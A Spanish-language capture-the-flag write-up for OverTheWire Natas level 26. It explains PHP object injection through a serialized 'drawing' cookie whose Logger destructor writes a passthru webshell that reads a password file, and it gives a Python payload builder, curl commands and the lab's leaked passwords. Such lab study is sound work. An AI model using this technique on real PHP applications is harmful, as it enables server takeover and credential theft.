# Natas Level26

## Descripción
> **Level Goal (natas26.natas.labs.overthewire.org):** Una app "para dibujar líneas" guarda el historial de trazos serializado y en base64 dentro de una cookie `drawing`, y lo recupera con `unserialize(base64_decode($_COOKIE["drawing"]))`. La app también define una clase `Logger` cuyo constructor abre un archivo de log y cuyo destructor (`__destruct`) escribe un mensaje de cierre en ese mismo archivo.

## Solución
Es una **inyección de objetos PHP (PHP Object Injection)**. `unserialize()` sobre datos controlados por el atacante permite instanciar *cualquier* clase definida en el código de la aplicación con las propiedades que uno quiera, **sin pasar por su constructor** (que es donde normalmente se validaría/sanearía el valor). La clase `Logger` es perfecta para explotar esto porque:

- Su constructor normal fija `$this->logFile` a una ruta fija bajo `/tmp/`, pero al deserializar un objeto `Logger` fabricado a mano, esa ruta la ponemos nosotros directamente como propiedad, sin restricción alguna (por ejemplo, un archivo `.php` dentro del directorio web público `img/`).
- Su destructor (`__destruct()`), que **sí se ejecuta siempre automáticamente al final del script**, escribe `$this->exitMsg` en `$this->logFile` — y ese mensaje también lo controlamos nosotros. Basta con poner código PHP ahí.

El resultado: fabricamos un objeto `Logger` serializado con `logFile = "img/<algo>.php"` y `exitMsg = "<?php passthru('...'); ?>"`, lo mandamos en la cookie `drawing`, y su destructor escribe un webshell PHP dentro del propio directorio público de la aplicación — que después simplemente visitamos por HTTP.

```python
import base64

def priv(cls, prop):
    return f"\0{cls}\0{prop}"  # PHP serializa propiedades private con el nombre de clase embebido

logfile = "img/n26_uniq7331.php"
initmsg = "unused"
exitmsg = "<?php passthru('cat /etc/natas_webpass/natas27'); ?>\n"

props = [
    (priv("Logger", "logFile"), logfile),
    (priv("Logger", "initMsg"), initmsg),
    (priv("Logger", "exitMsg"), exitmsg),
]
body = "".join(f's:{len(k.encode())}:"{k}";s:{len(v.encode())}:"{v}";' for k, v in props)
serialized = f'O:6:"Logger":{len(props)}:{{{body}}}'
cookie = base64.b64encode(serialized.encode()).decode()
print(cookie)
```

```bash
# Enviar el objeto malicioso en la cookie "drawing" para que se escriba el webshell
curl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT -b "drawing=$COOKIE" \
  http://natas26.natas.labs.overthewire.org/index.php -o /dev/null

# Visitar el webshell recién escrito
curl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT \
  http://natas26.natas.labs.overthewire.org/img/n26_uniq7331.php
# mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
```

## Notas adicionales
- Las propiedades `private` de PHP se serializan con el nombre de la propiedad envuelto entre bytes nulos y el nombre de la clase (`"\0Logger\0logFile"`), y su longitud declarada en el formato serializado debe contar esos bytes nulos igual que cualquier otro carácter — un detalle fácil de pasar por alto al construir el payload a mano.
- Se usó un nombre de archivo (`n26_uniq7331.php`) distinto del que se probó primero, porque el directorio `img/` es compartido por todos los jugadores del wargame en el mismo servidor: un nombre "obvio" (como `pwn26.php`) ya tenía contenido de un intento anterior (propio o ajeno) y devolvía resultados mezclados/duplicados por escrituras en modo *append*.
- Este es un ejemplo canónico de por qué `unserialize()` nunca debe usarse sobre datos que provengan del cliente (cookies, parámetros, cabeceras): cualquier clase con un `__destruct`, `__wakeup` o similar que tenga efectos secundarios (escribir archivos, hacer llamadas, etc.) se convierte en una "gadget chain" potencial. La alternativa segura en PHP moderno es `json_encode`/`json_decode` para datos estructurados que no necesiten preservar tipos de objeto.

## Referencias
- Reto original: http://natas26.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection (OWASP, PHP Object Injection)
- Apoyo: https://www.php.net/manual/en/language.oop5.serialization.php (manual de PHP sobre serialización de objetos, incluida la codificación de propiedades `private`/`protected`)
